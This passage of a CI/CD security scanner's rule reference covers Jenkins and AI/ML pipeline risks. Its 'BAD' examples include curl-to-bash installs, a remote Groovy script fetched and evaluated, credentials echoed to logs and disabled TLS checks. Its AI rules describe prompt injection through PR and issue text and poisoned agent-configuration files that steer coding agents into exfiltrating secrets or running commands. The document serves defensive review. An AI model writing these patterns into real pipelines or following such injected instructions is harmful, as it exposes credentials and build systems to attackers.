A Jenkins pipeline uses an input step for manual approval but does not specify the 'submitter' parameter. Without submitter, any authenticated Jenkins user can approve the gate — including developers with read-only access to the job. For production deployments this means the approval provides no assurance that a qualified person reviewed the change. An attacker with any Jenkins login could approve their own malicious deployment.

**Remediation:** Restrict approvals to a named group or user:

input {
    message 'Deploy to production?'
    ok 'Deploy'
    submitter 'release-team,ops-leads'   // comma-separated user IDs or groups
}

**References:**
- https://www.jenkins.io/doc/pipeline/steps/pipeline-input-step/

---

#### SEC4-JK-005 — PR author or URL environment variable used in shell — attacker-controlled content

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-4

A Jenkins pipeline interpolates CHANGE_AUTHOR_EMAIL, CHANGE_AUTHOR_DISPLAY_NAME, CHANGE_URL, GIT_COMMITTER_NAME, or GIT_COMMITTER_EMAIL into a shell command. These are populated from pull request metadata and are entirely attacker-controlled. A crafted display name or email containing shell metacharacters enables command injection. SEC4-JK-002 covers GIT_BRANCH, BRANCH_NAME, CHANGE_BRANCH, CHANGE_TITLE, and CHANGE_AUTHOR; this rule covers the remaining PR author fields.

**Remediation:** Pass PR metadata through environment variables and validate before use:

// BAD
sh "git config user.email ${env.CHANGE_AUTHOR_EMAIL}"

// GOOD
withEnv(["AUTHOR_EMAIL=${env.CHANGE_AUTHOR_EMAIL}"]) {
    sh '''
        echo "$AUTHOR_EMAIL" | grep -qE '^[^@]+@[^@]+$' || exit 1
        git config user.email "$AUTHOR_EMAIL"
    '''
}

**References:**
- https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution

---

### CICD-SEC-5

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC5-JK-001 | MEDIUM | Pipeline with deploy stage lacks disableConcurrentBuilds — concurrent deployment race |

#### SEC5-JK-001 — Pipeline with deploy stage lacks disableConcurrentBuilds — concurrent deployment race

**Severity:** MEDIUM  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-5

A Jenkins pipeline contains a deployment stage but does not use disableConcurrentBuilds() in the options block. Without this, multiple simultaneous pipeline runs can execute deployment stages in parallel against the same target environment, causing race conditions or one run overwriting the state established by another. This is the Jenkins equivalent of GitLab's resource_group: feature.

**Remediation:** Add disableConcurrentBuilds to the pipeline options block:

pipeline {
    options {
        disableConcurrentBuilds(abortPrevious: true)
    }
    ...
    stage('Deploy to Production') { ... }
}

**References:**
- https://www.jenkins.io/doc/book/pipeline/syntax/#options

---

### CICD-SEC-6

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC6-JK-001 | HIGH | Hardcoded credential value in Jenkins environment block |
| SEC6-JK-002 | HIGH | Credential variable echoed or printed inside withCredentials block |
| SEC6-JK-003 | HIGH | println may expose credential variable inside withCredentials block |
| SEC6-JK-004 | HIGH | TLS certificate verification disabled in shell step |
| SEC6-JK-005 | MEDIUM | Long-lived cloud credential in Jenkins environment block — use OIDC plugin instead |
| SEC6-JK-006 | HIGH | writeFile step writes private key or credential material to workspace |
| SEC6-JK-007 | HIGH | Windows bat step uses Groovy string interpolation of user-controlled value |

#### SEC6-JK-001 — Hardcoded credential value in Jenkins environment block

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-6

A Jenkins environment block contains what appears to be a hardcoded credential value — a variable named with a credential-related keyword assigned a string literal of sufficient length to be a real secret. Hardcoded credentials in Jenkinsfiles are stored in version control in plain text, visible to everyone with repository read access. If the repository is ever made public or the VCS is compromised, the credential is immediately exposed. Use Jenkins Credentials Binding to store secrets in the Jenkins credential store instead.

**Remediation:** Store credentials in the Jenkins credential store and bind them at runtime:

environment {
    // Bind from Jenkins credential store — never hardcode
    API_TOKEN = credentials('my-api-token-credential-id')
}

Or use withCredentials() for scoped binding:
withCredentials([string(credentialsId: 'my-token', variable: 'API_TOKEN')]) {
    sh 'curl -H "Authorization: Bearer $API_TOKEN" ...'
}

**References:**
- https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#handling-credentials

---

#### SEC6-JK-002 — Credential variable echoed or printed inside withCredentials block

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-6

A Jenkins pipeline uses withCredentials() to bind a secret, but also contains an echo or shell command that prints a variable — which may expose the bound credential to the build log. Jenkins masks credential values in logs by default, but masking can be bypassed by encoding the value (base64, hex), splitting it across multiple echo calls, or using certain shell constructs. The safest approach is to never echo credential variables at all.

**Remediation:** Never echo credential variables, even masked ones:

// BAD
withCredentials([string(credentialsId: 'token', variable: 'TOKEN')]) {
    echo "Token: $TOKEN"   // exposed even if masked
    sh "echo $TOKEN"       // bypasses Jenkins masking in some shells
}

// GOOD — use the variable only in the command that needs it
withCredentials([string(credentialsId: 'token', variable: 'TOKEN')]) {
    sh 'curl -H "Authorization: Bearer $TOKEN" https://api.example.com'
}

**References:**
- https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#handling-credentials

---

#### SEC6-JK-003 — println may expose credential variable inside withCredentials block

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-6

A Jenkins pipeline uses `println` to log a variable inside a `withCredentials()` block. `println` writes directly to the build log — unlike `sh 'echo'`, Groovy's println can bypass Jenkins credential masking in some configurations and plugin versions. Even when masking works, logging credential variables establishes a habit that is easy to exploit through encoding tricks (e.g. printing the base64-encoded value).

**Remediation:** Never log credential variables. Remove println statements that reference bound credential variables:

// BAD
withCredentials([string(credentialsId: 'token', variable: 'TOKEN')]) {
    println "Using token: ${TOKEN}"   // may bypass masking
}

// GOOD — log intent, not value
withCredentials([string(credentialsId: 'token', variable: 'TOKEN')]) {
    println 'Authenticating with stored credential'
    sh 'curl -H "Authorization: Bearer $TOKEN" https://api.example.com'
}

**References:**
- https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#handling-credentials

---

#### SEC6-JK-004 — TLS certificate verification disabled in shell step

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-6

A Jenkins pipeline shell step runs curl with -k/--insecure or wget with --no-check-certificate, disabling TLS certificate verification. This allows man-in-the-middle attacks: an attacker on the network path can intercept the connection, serve a forged certificate, and inject malicious content into the response — including malicious scripts, forged artifacts, or false API responses that compromise the build or deployment.

**Remediation:** Fix the underlying certificate issue rather than disabling verification:

// BAD
sh 'curl -k https://internal.example.com/api'

// GOOD — add CA cert to trust store
sh 'curl --cacert /etc/ssl/certs/internal-ca.pem https://internal.example.com/api'

**References:**
- https://owasp.org/www-project-top-10-ci-cd-security-risks/

---

#### SEC6-JK-005 — Long-lived cloud credential in Jenkins environment block — use OIDC plugin instead

**Severity:** MEDIUM  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-6

The pipeline environment block references long-lived cloud provider credentials (AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, GOOGLE_APPLICATION_CREDENTIALS, AZURE_CLIENT_SECRET). These are static credentials that remain valid indefinitely — a leaked key gives persistent cloud access. Modern CI/CD should use OIDC-based short-lived credential exchange (AWS Credentials Plugin, Google OAuth Plugin) which generate ephemeral tokens scoped to each build run.

**Remediation:** Use the Jenkins AWS Credentials Plugin or similar for short-lived OIDC tokens:

withAWS(credentials: 'aws-oidc-role', region: 'us-east-1') {
    sh 'aws s3 sync dist/ s3://my-bucket/'
}

**References:**
- https://plugins.jenkins.io/aws-credentials/

---

#### SEC6-JK-006 — writeFile step writes private key or credential material to workspace

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-6

A Jenkins pipeline uses writeFile to write content containing a private key, certificate, or credential to the workspace. Workspace contents may persist between builds on permanent agents, be accessible to other pipelines on the same agent, and can be unintentionally archived if artifact glob patterns are too broad. Private key material written to disk should be deleted immediately after use and should never be archived.

**Remediation:** Use withCredentials sshUserPrivateKey binding — Jenkins manages the temp file:

withCredentials([sshUserPrivateKey(credentialsId: 'deploy-key', keyFileVariable: 'KEY_FILE')]) {
    sh 'ssh -i "$KEY_FILE" user@host ./deploy.sh'
}

If writeFile is unavoidable, always delete in a finally block:
try {
    writeFile file: '/tmp/deploy.pem', text: pemContent
    sh 'ssh -i /tmp/deploy.pem user@host ./deploy.sh'
} finally {
    sh 'rm -f /tmp/deploy.pem'
}

**References:**
- https://www.jenkins.io/doc/book/pipeline/jenkinsfile/#handling-credentials

---

#### SEC6-JK-007 — Windows bat step uses Groovy string interpolation of user-controlled value

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-6

A Jenkins pipeline bat (Windows batch) step uses Groovy double-quoted string interpolation to embed a user-controlled value (params.* or env.*) directly into the command. Groovy resolves the interpolation before cmd.exe sees the command — on Windows this enables injection via & | > < and similar metacharacters. This is the Windows equivalent of the shell injection risk covered by SEC4-JK-001 and SEC4-JK-002.

**Remediation:** Pass values via withEnv to avoid inline Groovy interpolation:

// BAD
bat "msbuild ${params.PROJECT} /t:Build"

// GOOD
withEnv(["PROJECT=${params.PROJECT}"]) {
    bat 'msbuild %PROJECT% /t:Build'
}

**References:**
- https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution

---

### CICD-SEC-7

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC7-JK-001 | MEDIUM | Jenkins pipeline uses unconstrained 'agent any' |
| SEC7-JK-002 | MEDIUM | Scripted pipeline node block without agent label — runs on any available node |
| SEC7-JK-003 | HIGH | docker.withRegistry called with null credentials — unauthenticated registry push |

#### SEC7-JK-001 — Jenkins pipeline uses unconstrained 'agent any'

**Severity:** MEDIUM  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-7

'agent any' allows Jenkins to schedule the pipeline on any available agent node in the build farm. In environments with mixed-trust build agents — for example, agents shared with other teams, cloud spot instances, or self-hosted community runners — this means sensitive builds can land on untrusted infrastructure with access to your workspace, environment variables, and any credentials bound during the build. Use labelled agents to constrain execution to known, trusted nodes.

**Remediation:** Constrain the pipeline to a specific labelled agent or Docker container:

// Use a labelled agent
agent { label 'trusted-linux' }

// Or use a pinned Docker image for full isolation
agent {
    docker {
        image 'ubuntu@sha256:abc123...'
        label 'docker-capable'
    }
}

**References:**
- https://www.jenkins.io/doc/book/pipeline/syntax/#agent

---

#### SEC7-JK-002 — Scripted pipeline node block without agent label — runs on any available node

**Severity:** MEDIUM  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-7

A scripted Jenkins pipeline uses `node { }` or `node() { }` without specifying an agent label. This is the scripted-pipeline equivalent of `agent any` (covered by SEC7-JK-001 for declarative pipelines) — the build can run on any connected agent, including untrusted cloud spot instances or agents shared with other teams. In mixed-trust environments, sensitive pipelines must be constrained to known, trusted nodes.

**Remediation:** Specify an agent label:

// BAD
node {
    stage('Build') { sh 'make' }
}

// GOOD
node('trusted-linux') {
    stage('Build') { sh 'make' }
}

**References:**
- https://www.jenkins.io/doc/book/pipeline/syntax/#scripted-pipeline

---

#### SEC7-JK-003 — docker.withRegistry called with null credentials — unauthenticated registry push

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-7

A Jenkins pipeline calls docker.withRegistry() with null as the credentials argument, disabling registry authentication. On registries that allow unauthenticated pushes (some self-hosted or misconfigured registries), this can overwrite images that are then pulled by other pipelines or production deployments — an image replacement attack with no identity trail.

**Remediation:** Always provide a credentials ID:

// BAD
docker.withRegistry('https://registry.example.com', null) { docker.build('myapp').push() }

// GOOD
docker.withRegistry('https://registry.example.com', 'registry-creds') { docker.build('myapp').push() }

**References:**
- https://www.jenkins.io/doc/book/pipeline/docker/#custom-registry

---

### CICD-SEC-8

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC8-JK-001 | HIGH | Jenkins Docker agent or step uses mutable :latest or untagged image |
| SEC8-JK-002 | CRITICAL | Remote Groovy script fetched from URL and executed |
| SEC8-JK-003 | HIGH | Git repository checked out from non-HTTPS URL — susceptible to MITM code injection |

#### SEC8-JK-001 — Jenkins Docker agent or step uses mutable :latest or untagged image

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-8

A Jenkins pipeline specifies a Docker image for the build agent or a pipeline step using the ':latest' tag or no tag at all. The Docker image is the execution environment for the entire job — all build scripts, bound credentials, workspace contents, and environment variables execute inside this container. A mutable ':latest' tag resolves to whatever the registry points at when the build runs. If the upstream image is compromised or unexpectedly updated, all subsequent builds execute attacker-controlled code with access to every credential and secret in scope.

**Remediation:** Pin Docker images to a SHA256 digest for a reproducible build environment:

agent {
    docker {
        image 'ubuntu@sha256:abc123...   // was ubuntu:latest'
    }
}

Find the current digest:
  docker pull ubuntu:latest && docker inspect ubuntu:latest | grep RepoDigests

**References:**
- https://www.jenkins.io/doc/book/pipeline/docker/

---

#### SEC8-JK-002 — Remote Groovy script fetched from URL and executed

**Severity:** CRITICAL  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-8

A Jenkins pipeline fetches a Groovy script from a remote URL using `new URL('...').text` and then executes or evaluates it. This is effectively a `curl | bash` for Groovy — the remote server controls what code runs on the Jenkins controller with full pipeline privileges, including access to all credentials, the Jenkins API, and the underlying host if the controller is not sandboxed. Unlike shared libraries, URL-fetched scripts bypass the Jenkins script approval mechanism entirely.

**Remediation:** Replace URL-fetched scripts with Jenkins Shared Libraries:

// BAD
def script = new URL('https://raw.githubusercontent.com/org/repo/main/script.groovy').text
evaluate(script)

// GOOD — use a pinned shared library instead
@Library('my-shared-lib@abc123sha') _
import org.example.MyHelper
MyHelper.doThing()

Shared libraries are version-controlled, reviewed, and approved through the Jenkins script approval mechanism.

**References:**
- https://www.jenkins.io/doc/book/pipeline/shared-libraries/

---

#### SEC8-JK-003 — Git repository checked out from non-HTTPS URL — susceptible to MITM code injection

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-8

A Jenkins pipeline checks out source code from a plain HTTP URL. HTTP connections are unencrypted — a network-level attacker can inject malicious code into the source tree before the build runs, insert compromised dependencies, or replace downloaded scripts without any visible error.

**Remediation:** Replace HTTP with HTTPS for all repository URLs:

// BAD
checkout([$class: 'GitSCM', userRemoteConfigs: [[url: 'http://github.com/org/repo.git']]])

// GOOD
checkout([$class: 'GitSCM', userRemoteConfigs: [[url: 'https://github.com/org/repo.git']]])

**References:**
- https://www.jenkins.io/doc/book/pipeline/syntax/#checkout

---

### CICD-SEC-9

| Rule ID | Severity | Title |
|---------|----------|-------|
| SEC9-JK-001 | HIGH | Jenkins pipeline downloads and executes content without integrity check |
| SEC9-JK-002 | LOW | archiveArtifacts called without fingerprint: true |
| SEC9-JK-003 | HIGH | wget downloads binary or script without checksum verification |

#### SEC9-JK-001 — Jenkins pipeline downloads and executes content without integrity check

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-9

A Jenkins pipeline step uses curl or wget to download content and pipes it directly to a shell interpreter (bash, sh) without any integrity verification. This pattern executes whatever the remote server returns at build time — if the URL is compromised (DNS hijack, supply chain attack on the hosting server, or a malicious redirect), the attacker's code runs inside the build environment with access to all credentials, secrets, and build artefacts. Verify downloads with a SHA256 checksum before executing.

**Remediation:** Download the script separately, verify its checksum, then execute:

// BAD
sh 'curl -fsSL https://get.example.com/install.sh | bash'

// GOOD
sh '''
    curl -fsSL https://get.example.com/install.sh -o install.sh
    echo 'abc123def456...  install.sh' | sha256sum --check
    bash install.sh
    rm install.sh
'''

**References:**
- https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-09-Improper-Artifact-Integrity-Validation

---

#### SEC9-JK-002 — archiveArtifacts called without fingerprint: true

**Severity:** LOW  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-9

A Jenkins pipeline archives build artifacts without enabling `fingerprint: true`. Fingerprinting records an MD5 hash of each archived artifact in Jenkins, creating a traceable record of which build produced which binary. Without fingerprinting, there is no built-in way to verify that a deployed artifact matches what was produced by a specific build — an attacker who replaces an artifact between archiving and deployment cannot be detected through Jenkins logs.

**Remediation:** Enable fingerprinting when archiving artifacts:

// Before
archiveArtifacts artifacts: 'dist/**/*.jar'

// After
archiveArtifacts artifacts: 'dist/**/*.jar', fingerprint: true

For stronger integrity guarantees, also generate and archive a SHA256 checksum manifest alongside the artifacts:
sh 'sha256sum dist/**/*.jar > dist/SHA256SUMS'
archiveArtifacts artifacts: 'dist/**', fingerprint: true

**References:**
- https://www.jenkins.io/doc/pipeline/steps/core/#archiveartifacts-archive-the-artifacts

---

#### SEC9-JK-003 — wget downloads binary or script without checksum verification

**Severity:** HIGH  
**Platform:** Jenkins  
**OWASP:** CICD-SEC-9

A Jenkins pipeline shell step uses wget to download a binary, archive, or script file but does not verify its integrity with a checksum. If the download source is compromised (CDN hijack, DNS poisoning, supply chain attack), the malicious file runs with full build environment access. SEC9-JK-001 covers the curl|bash pattern; this rule covers the wget case where the file is downloaded and later executed without a sha256sum step.

**Remediation:** Verify the checksum before executing any downloaded file:

// BAD
sh 'wget -q https://releases.example.com/tool-v2.0.tar.gz'
sh 'tar xzf tool-v2.0.tar.gz && ./tool-v2.0/install.sh'

// GOOD
sh '''
    wget -q https://releases.example.com/tool-v2.0.tar.gz
    echo 'abc123def456...  tool-v2.0.tar.gz' | sha256sum --check
    tar xzf tool-v2.0.tar.gz && ./tool-v2.0/install.sh
'''

**References:**
- https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-09-Improper-Artifact-Integrity-Validation

---

---

## AI / ML Security Rules

AI-specific rules target risks that don't share a remediation path with classic CI/CD rules: executable model files, AI coding agents with tool access, MCP server hygiene, and LLM output as a control channel. Findings in this category cluster into the `ai_ml_model_risk` family in reports.

### GitHub Actions

| Rule ID | Severity | Title |
|---------|----------|-------|
| AI-GH-001 | CRITICAL | HuggingFace trust_remote_code=True executes code from the model repo |
| AI-GH-002 | MEDIUM | HuggingFace model / dataset downloaded without a pinned revision SHA |
| AI-GH-003 | HIGH | torch.load() without weights_only=True — pickle RCE on model load |
| AI-GH-004 | MEDIUM | Model artefact fetched in a job that runs no pickle / model scanner |
| AI-GH-005 | HIGH | LLM API call in a workflow that also reads attacker-controlled PR/issue content |
| AI-GH-006 | HIGH | AI coding agent action runs on a fork-triggerable event |
| AI-GH-007 | HIGH | LLM output reaches a shell interpreter or $GITHUB_ENV / $GITHUB_OUTPUT |
| AI-GH-008 | HIGH | AI coding agent runs in a job that checks out attacker-controlled PR code |
| AI-GH-009 | CRITICAL | AI agent runs with permission / sandbox controls disabled on a fork-triggerable event |
| AI-GH-010 | HIGH | Non-torch pickle-backed loader without safety flag — pickle RCE on load |
| AI-GH-011 | HIGH | MCP server loaded from a registry runner without a version pin |
| AI-GH-012 | HIGH | Privileged-scope MCP server loaded on a fork-triggerable event |
| AI-GH-013 | HIGH | Agentic CLI invoked in a fork-triggerable workflow |

### GitLab CI

| Rule ID | Severity | Title |
|---------|----------|-------|
| AI-GL-001 | CRITICAL | HuggingFace trust_remote_code=True executes code from the model repo (GitLab) |
| AI-GL-002 | HIGH | LLM output reaches a shell interpreter in a GitLab script |
| AI-GL-003 | HIGH | Non-torch pickle-backed loader without safety flag (GitLab) |

### Jenkins

| Rule ID | Severity | Title |
|---------|----------|-------|
| AI-JK-001 | CRITICAL | HuggingFace trust_remote_code=True executes code from the model repo (Jenkins) |
| AI-JK-002 | HIGH | torch.load() without weights_only=True — pickle RCE on model load (Jenkins) |
| AI-JK-003 | HIGH | LLM output reaches a shell interpreter inside a Jenkins step |
| AI-JK-004 | HIGH | Non-torch pickle-backed loader without safety flag (Jenkins) |

#### AI-GH-001 — HuggingFace trust_remote_code=True executes code from the model repo

**Severity:** CRITICAL  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-3

A transformers / diffusers / datasets call sets `trust_remote_code=True`. This flag tells the HuggingFace library to import and execute Python modules shipped inside the model repository itself — the downloaded `.py` files run with the workflow's full permissions, secrets, and token before any inference happens. A compromised or typo-squatted model repo therefore behaves exactly like a malicious package install. The flag has no safe default: use an explicit model class that does not require remote code, or pin to a specific revision SHA whose code you have audited.

**Remediation:**

```
Do not opt into remote-code execution by default. Instead:

1. Drop the flag and use a built-in architecture —    `AutoModel.from_pretrained(name)` works without    `trust_remote_code` for every officially supported    architecture.

2. If the model genuinely requires remote code, pin to a    full 40-character `revision=` SHA that you have    reviewed, and keep the trusted model list in the    repository rather than in free-form workflow text.

3. Consider moving untrusted-model inference to a sandboxed    job with no secrets and no write-scoped token.
```

**References:**
- https://huggingface.co/docs/transformers/en/main_classes/model#transformers.PreTrainedModel.from_pretrained.trust_remote_code

---

#### AI-GH-002 — HuggingFace model / dataset downloaded without a pinned revision SHA

**Severity:** MEDIUM  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-3

A HuggingFace download helper (`huggingface-cli download`, `snapshot_download`, `hf_hub_download`, `load_dataset`) runs without pinning the fetched artefact to a full 40-char commit SHA via `--revision` or `revision=`. The HuggingFace Hub is git-backed: branches and tags can be force-pushed or recreated, so an unpinned fetch resolves to different bytes on different runs without any signal in the workflow. A compromised or typo-squatted repo therefore ships new weights, new dataset rows, or new `.py` files to every subsequent pipeline run. Pin the `revision` to an immutable 40-char SHA — the same rule that applies to `actions/*@v4` applies to model and dataset fetches.

**Remediation:**

```
Pin every HuggingFace fetch to a full 40-char commit SHA:

  huggingface-cli download org/model \
    --revision abc123def456abc123def456abc123def456abc1

  from huggingface_hub import snapshot_download
  snapshot_download(
      repo_id='org/model',
      revision='abc123def456abc123def456abc123def456abc1',
  )

Find the current SHA:
  huggingface-cli repo info org/model --revision main

Keep the human-readable tag in a nearby comment so the pin stays maintainable:
  revision='abc123...'   # v1.2.0
```

**References:**
- https://huggingface.co/docs/huggingface_hub/en/guides/download#download-files-from-a-specific-revision

---

#### AI-GH-003 — torch.load() without weights_only=True — pickle RCE on model load

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-3

A workflow calls `torch.load(...)` without explicitly passing `weights_only=True`. PyTorch's default unpickler calls `pickle.load`, which runs arbitrary Python via `__reduce__` the moment the file is opened — no model code ever has to run. PyTorch 2.6 flipped the default to `weights_only=True`, but every workflow that still runs on an older pinned version (and every `.ckpt` / `.pt` file from an untrusted source on any version) remains exposed. Set the flag explicitly so the safe behaviour doesn't depend on which PyTorch ends up in the job.

**Remediation:**

```
Pass `weights_only=True` to every `torch.load` call that reads a checkpoint you didn't generate on this same pipeline run:

  state = torch.load(path, weights_only=True)

For weights that genuinely require pickled objects (custom classes, optimiser state), load them in a sandboxed job with no secrets and no write-scoped token, or switch the artefact format to `.safetensors` which is tensor-only by construction.
```

**References:**
- https://pytorch.org/docs/stable/generated/torch.load.html

---

#### AI-GH-004 — Model artefact fetched in a job that runs no pickle / model scanner

**Severity:** MEDIUM  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-3

A job fetches a model artefact (`huggingface-cli download`, `snapshot_download`, `hf_hub_download`, or a `wget` / `curl` of a `.pt` / `.ckpt` / `.bin` / `.pkl` file) but no pickle- or model-scanner (`picklescan`, `modelscan`, `fickling`) runs in the same job. That means the first thing to parse the bytes is the ML framework's own unpickler, which executes arbitrary Python via `__reduce__` the moment the file is opened. Running a dedicated scanner before the model loads closes that window — it won't catch every payload (the scanners have known bypasses), but it does raise the attacker's cost from 'publish a pickle' to 'craft something that slips past the allowlist'. This rule cannot verify that the scanner ran on the specific file that was fetched; it only reports that no scanner was invoked in the same job at all.

**Remediation:**

```
Run a model scanner on the fetched file before the ML framework ever touches it. Pick one:

  - run: pip install picklescan && picklescan --path models/
  - run: pip install modelscan && modelscan --path models/model.pt
  - run: pip install fickling && fickling models/model.pt

Fail the job on a non-zero exit so a flagged file can't reach `torch.load`. For HuggingFace repos, combine the scanner with a pinned `--revision` (AI-GH-002) and `weights_only=True` on `torch.load` (AI-GH-003) — the scanner is a third layer, not a replacement for the other two.
```

**References:**
- https://github.com/protectai/modelscan

---

#### AI-GH-005 — LLM API call in a workflow that also reads attacker-controlled PR/issue content

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

A workflow invokes an LLM SDK or HTTP endpoint (`openai.*` / `anthropic.*` / `ChatOpenAI` / `api.openai.com` / `api.anthropic.com` / `generativelanguage.googleapis.com`) in the same file that references attacker-controlled GitHub context — PR title / body, issue title / body, comment body, review body, or discussion body. If that text ever reaches the model as part of the prompt, the attacker can use indirect prompt injection to steer the model into emitting commands, exfiltrating secrets via tool calls, or producing output that a later step feeds into `eval` / `bash`. The rule fires on the LLM call line. It can't prove the attacker-controlled text actually reaches the prompt — that determination is left to review — so the finding is surfaced at medium confidence. What it does prove is that the two ingredients are in the same workflow, which is the necessary precondition for the attack.

**Remediation:**

```
Treat LLM output on attacker-controlled input as untrusted data, the same way you treat a fork PR's source tree:

1. Never pass the model's output into `bash -c`,    `eval`, `$(...)`, `$GITHUB_ENV`, or    `$GITHUB_OUTPUT` without strict structural    validation. Parse JSON, reject anything outside an    allowlist of fields, and fail closed on parse error.

2. If the LLM is also given tool access (function calling,    code execution, a shell tool), scope the tools tightly    and run them in a container with no secrets and no    write-scoped GITHUB_TOKEN.

3. Isolate the prompt-handling step into a separate    workflow triggered by `workflow_run` against a    pinned base-branch SHA, so a poisoned PR body can't    reach a job that holds release credentials.

4. Strip or sandbox the attacker-controlled fields    before they reach the prompt, and log both the    pre-prompt input and the post-model output for    audit.
```

**References:**
- https://simonwillison.net/2023/May/2/prompt-injection/

---

#### AI-GH-006 — AI coding agent action runs on a fork-triggerable event

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

A dedicated AI coding-agent action (`anthropics/claude-code-action`, Aider, OpenHands, Cursor, CodeRabbit AI reviewer, `ai-review` / `gpt-pr` / `llm-agent` flavours) runs in a file whose trigger list includes a fork-controllable event (`pull_request`, `pull_request_target`, `issue_comment`, `issues`, `discussion`, `workflow_run`). The risk is different from AI-GH-005. The agent doesn't need the workflow YAML to explicitly interpolate attacker-controlled text into a prompt — the agent's own tools (`gh api`, MCP bindings, repository-read tools, comment readers) give it direct access to the PR body, diff, issue thread, and review comments. Prompt injection into any of those surfaces lets the agent be steered to use its OTHER tools (file edits, commits, comment writes) with the workflow's `GITHUB_TOKEN`. This rule flags the precondition; confirming or downgrading the risk depends on whether the job's permissions actually grant write scope and whether a fork-identity guard is in place (`if: github.event.pull_request.head.repo.full_name == github.repository`). The finding is surfaced at medium confidence and, when permissions are tightly scoped, should be triaged as review-needed rather than as a confirmed breach.

**Remediation:**

```
Tighten the blast radius before fork-controllable events can reach the agent:

1. Gate the job on a fork-identity check so the agent    never runs on a fork PR without explicit maintainer    approval:
     if: github.event.pull_request.head.repo.full_name == github.repository

2. Scope `permissions:` to the minimum the agent needs.    Default `contents: read`, and only add write scopes    that the agent's declared tool set actually uses —    never `write-all`, never a blanket default.

3. Constrain the agent's tool surface. For    `anthropics/claude-code-action` pass    `--allowedTools` / `--disallowedTools`; for other    agents review the MCP server bindings and the    shell-exec path.

4. Pin the agent action to a full commit SHA (also    covered by SEC3-GH-001 / -002). A force-pushed `@v1`    or `@main` lets an attacker ship new agent    behaviour into every downstream CI on the next run.
```

**References:**
- https://docs.anthropic.com/claude-code

---

#### AI-GH-007 — LLM output reaches a shell interpreter or $GITHUB_ENV / $GITHUB_OUTPUT

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

A workflow captures the output of an LLM call and feeds it into a shell interpreter or writes it into `$GITHUB_ENV` / `$GITHUB_OUTPUT`. Patterns caught: `... | bash` / `... | sh` / `... | eval` / `... | python -c` after an `openai` / `anthropic` / `llm` / `aider` / `claude -p` / `curl api.openai.com ...` call; `echo "$(openai ...)" >> $GITHUB_ENV`; `eval "$(llm ...)"`. Any of these turns model output into workflow code. Since the model's prompt can be steered by attacker-controlled PR / issue / comment content (AI-GH-005 territory), this is a direct injection path with no intermediate review step.

**Remediation:**

```
Treat LLM output as untrusted attacker-shaped data. Never feed it to a shell interpreter, `eval`, or a GitHub-Actions control file. Concrete fixes:

1. Ask the model for structured JSON, write it to a    file, and parse it with `jq` into a strict    allowlist of fields — reject on parse error.

2. If the downstream step needs an env var, set it    from a validated field: `jq -r '.label' response.json    | grep -E '^(bug|feat|chore)$' >> $GITHUB_OUTPUT`.

3. Do not use command substitution to splice LLM output    into later commands. Write to a file, validate,    then consume explicitly.
```

**References:**
- https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable

---

#### AI-GH-008 — AI coding agent runs in a job that checks out attacker-controlled PR code

**Severity:** HIGH  
**Platform:** GitHub Actions  
**OWASP:** CICD-SEC-4

A job checks out attacker-controlled code via `github.event.pull_request.head.(sha|ref)`, `github.head_ref`, or `github.event.workflow_run.head_branch` AND runs an AI coding agent (`anthropics/claude-code-action`, Aider, OpenHands, Cursor, CodeRabbit, or agentic CLIs invoked through `run:`). AI agents auto-load behaviour-defining files from the workspace: `CLAUDE.md`, `AGENTS.md`, `.cursorrules`, `.aider.conf.yml`, `.mcp.json`, and the `.claude/` and `.claude/skills/` trees. Because the attacker controls those files in the PR, they can rewrite the agent's system prompt, add new MCP servers, register new skills, or disable its safety guards — before the agent runs, without ever needing a prompt-injection payload in PR body text. This is the same LOTP shape as LOTP-GH-001 (build tools on PR code) but for agent-configuration files.

**Remediation:**

```
Either check out a trusted ref (the base SHA, a pinned tag) in the job that runs the agent, or split the agent into its own workflow that doesn't expose the attacker-controlled workspace:

1. Gate the checkout on fork identity:
     if: github.event.pull_request.head.repo.full_name == github.repository

2. If the agent needs to see the PR content, extract    only the specific files it needs into a separate    scratch directory after validating their shape.

